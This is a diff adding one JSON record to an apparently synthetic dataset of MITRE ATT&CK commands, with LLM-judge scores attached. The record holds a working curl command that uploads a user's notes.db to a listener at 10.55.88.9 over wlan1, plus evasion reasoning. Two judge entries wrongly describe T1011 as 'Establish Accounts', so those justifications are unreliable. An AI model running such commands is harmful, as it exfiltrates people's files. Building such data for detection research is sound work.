@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
+  "explanation": "Uses curl bound to wlan1 to PUT a file to an HTTP listener on a high port, representing exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Check wlan1 operability with iwconfig.",
+    "Force the HTTP transfer over wlan1 via curl's --interface option.",
+    "Use an uncommon port to avoid typical web traffic signatures while not altering system routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-998ddfac",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), valid flags for both iwconfig and curl, correct redirection syntax (>/dev/null 2>&1), and appropriate parameter usage.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration by uploading a file to a remote server, it doesn't align with T1011 (Exfiltration Over Other Network Medium) correctly as it's checking for wlan1 interface existence but not necessarily using an alternate/out-of-band network medium distinct from the primary communication channel.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T08:53:14.983487Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for commands, flags, redirection, and logical operators.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs file exfiltration using curl, which is completely unrelated to the MITRE ATT&CK technique T1011 (Establish Accounts).",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T08:53:21.410773Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with proper redirection, chaining, and valid curl options.",
+        "semantic_score": 1,
+        "semantic_justification": "Per the provided technique description (Establish Accounts), the command is misaligned as it performs HTTP file exfiltration via wlan1 rather than creating or abusing accounts.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T08:53:33.879966Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
